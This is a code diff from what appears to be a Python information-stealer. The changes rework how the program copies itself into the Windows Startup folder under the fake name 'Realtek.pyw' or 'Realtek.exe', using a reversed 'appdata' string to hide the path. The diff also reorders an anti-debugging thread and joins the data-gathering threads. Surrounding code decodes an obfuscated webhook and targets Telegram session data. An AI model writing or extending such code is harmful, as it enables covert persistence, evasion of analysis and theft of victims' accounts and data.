@@ -272,7 +272,7 @@ def Clipboard():
 
 apppp = 'atadppa'
 path = f"{os.getenv(f'{apppp[::-1]}')}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Realtek.pyw"
-path = check_python_or_convert(path)
+
 def get_random_path():
     possible_paths = [os.getenv("APPDATA"), os.getenv("LOCALAPPDATA")]
     chosen_path = random.choice(possible_paths)
@@ -323,24 +323,33 @@ def startup():
         try:
     
             new_path = create_copy_and_return_new_path()
-            new_path = check_python_or_convert(new_path)
             try:
                 add_to_startup(new_path)
             except Exception as e:
                 pass
         except:
             pass
-        apppp = 'atadppa'
-        path = check_python_or_convert(path)
-        if not isfile(path):
-            path = f"{os.getenv(f'{apppp[::-1]}')}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
-            copy(__file__, path)
-    
+    except:
+        pass
+        
+    try:
+        if getattr(sys, 'frozen', False):
+            path = sys.executable
         else:
-            if __file__.replace('\\', '/') != path.replace('\\', '/'):
-                pass
-    except:pass
-
+            path = __file__
+        
+        print(path)
+        startuppath = f"{os.getenv(f'{apppp[::-1]}')}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Realtek.pyw"
+        if not isfile(startuppath):
+            if ".py" in path:
+                copy(path, startuppath)
+                print('copied')
+            else:
+                startuppath = f"{os.getenv(f'{apppp[::-1]}')}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Realtek.exe"
+                copy(path, startuppath)
+    except:
+        pass
+    
 def LoadUrlib(hook, data='', files='', headers=''):
     
     hook = deobf(webhook[0],webhook[1]).decode()
@@ -1944,7 +1953,16 @@ def GatherAll():
     Telegram = [f"{roaming}/Telegram Desktop/tdata", 'telegram.exe', "Telegram"]
     aa = []
     
-       
+    try:
+        if antidebugging == True:
+            ad = threading.Thread(target=antidebug)
+            ad.start()
+            aa.append(ad)
+        else:
+            pass
+    except:
+        pass
+    
     getinf = threading.Thread(target=getinfo)
     getinf.start()
     aa.append(getinf)
@@ -2020,16 +2038,8 @@ def GatherAll():
     scr.start()
     aa.append(scr)
     
-    
-    try:
-        if antidebugging == True:
-            ad = threading.Thread(target=antidebug)
-            ad.start()
-            aa.append(ad)
-        else:
-            pass
-    except:
-        pass
+    for thread in aa:
+        thread.join()
 
     
     if injection == True:
